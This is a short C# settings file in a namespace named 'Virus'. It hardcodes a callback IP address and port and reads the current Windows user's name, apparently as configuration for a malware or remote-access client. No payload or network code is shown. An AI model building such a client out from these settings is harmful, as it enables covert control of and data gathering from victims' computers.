using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace Virus
{
    static class Settings
    {
        public static IPAddress address = IPAddress.Parse("192.168.1.232");
        public static int port = 25565;
        public static string Name = System.Security.Principal.WindowsIdentity.GetCurrent().Name.Split((@"\").ToCharArray()[0])[1];
    }
}
